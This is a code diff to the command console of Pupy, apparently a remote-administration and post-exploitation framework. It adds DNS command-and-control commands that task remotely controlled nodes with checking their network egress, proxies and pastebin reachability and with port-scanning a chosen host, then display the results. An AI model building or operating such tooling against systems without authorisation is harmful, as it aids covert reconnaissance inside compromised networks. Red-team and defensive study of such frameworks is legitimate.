@@ -1074,6 +1074,15 @@ class PupyCmd(cmd.Cmd):
 
         reexec = commands.add_parser('reexec', help='Try to reexec module')
 
+        onlinestatus = commands.add_parser('onlinestatus', help='Try to check network ability (warning: noisy)')
+
+        extra = commands.add_parser('extra', help='Get extra info from session (cyan colored)')
+
+        scan = commands.add_parser('scan', help='Try to connect to remote host ports (range)')
+        scan.add_argument('host', type=str, help='Host')
+        scan.add_argument('first', type=int, help='First port in range')
+        scan.add_argument('last', type=int, nargs='?', help='Last port in range')
+
         sleep = commands.add_parser('sleep', help='Postpone any activity')
         sleep.add_argument('-t', '--timeout', default=10, type=int, help='Timeout (seconds)')
 
@@ -1175,6 +1184,8 @@ class PupyCmd(cmd.Cmd):
                     color = 'lightyellow'
                 elif session.system_status['cpu'] > 90 or session.system_status['mem'] > 90:
                     color = 'lightred'
+                elif (session.online_status or session.egress_ports or session.open_ports):
+                    color = 'cyan'
 
                 if color:
                     object = { k:colorize(v, color) for k,v in object.iteritems() }
@@ -1293,6 +1304,25 @@ class PupyCmd(cmd.Cmd):
             elif args.node:
                 self.display_error('Node {} not found'.format(args.node))
 
+        elif args.command == 'onlinestatus':
+            count = self.dnscnc.onlinestatus(node=args.node, default=args.default)
+
+            if count:
+                self.display_success('Schedule online status request to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'scan':
+            count = self.dnscnc.scan(
+                args.host, args.first, args.last or args.first,
+                node=args.node, default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule online status request to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
         elif args.command == 'disconnect':
             count = self.dnscnc.disconnect(
                 node=args.node,
@@ -1383,6 +1413,65 @@ class PupyCmd(cmd.Cmd):
 
             except ValueError as e:
                 self.display_error('{}'.format(e))
+
+        elif args.command == 'extra':
+            sessions = self.dnscnc.list(args.node)
+            if not sessions:
+                self.display_error('No sessions found')
+                return
+            elif len(sessions) > 1:
+                self.display_error('Selected more than one sessions')
+                return
+
+            session = sessions[0]
+
+            if session.online_status:
+                self.display('\nONLINE STATUS\n')
+                objects = [
+                    {
+                        'KEY':colorize(
+                            k.upper().replace('-', ' '),
+                            'green' if session.online_status[k] else 'lightyellow'
+                        ),
+                        'VALUE':colorize(
+                             str(session.online_status[k]).upper(),
+                             'green' if session.online_status[k] else 'lightyellow'
+                        )
+                    } for k in [
+                        'online', 'igd', 'hotspot', 'dns',
+                        'direct-dns', 'http', 'https',
+                        'https-no-cert', 'https-mitm', 'proxy',
+                        'transparent-proxy'
+                    ]
+                ]
+
+                self.display(PupyCmd.table_format(objects, wl=['KEY', 'VALUE']))
+
+                self.display('\nPASTES STATUS\n')
+                objects = [
+                    {
+                        'KEY': colorize(k, 'green' if v else 'lightyellow'),
+                        'VALUE':colorize(v, 'green' if v else 'lightyellow')
+                    } for k,v in session.online_status['pastebins'].iteritems()
+                ]
+                self.display(PupyCmd.table_format(objects, wl=['KEY', 'VALUE']))
+
+                session.online_status = None
+
+            if session.egress_ports:
+                self.display('\nEGRESS PORTS: {}\n'.format(','.join(str(x) for x in session.egress_ports)))
+                session.egress_ports = set()
+
+            if session.open_ports:
+                self.display('\nOPEN PORTS\n')
+                objects = [
+                    {
+                        'IP': str(ip),
+                        'PORTS': ','.join(str(x) for x in ports)
+                    } for ip,ports in session.open_ports.iteritems()
+                ]
+                self.display(PupyCmd.table_format(objects, wl=['IP', 'PORTS']))
+                session.open_ports = {}
 
     def do_exit(self, arg):
         """ Quit Pupy Shell """
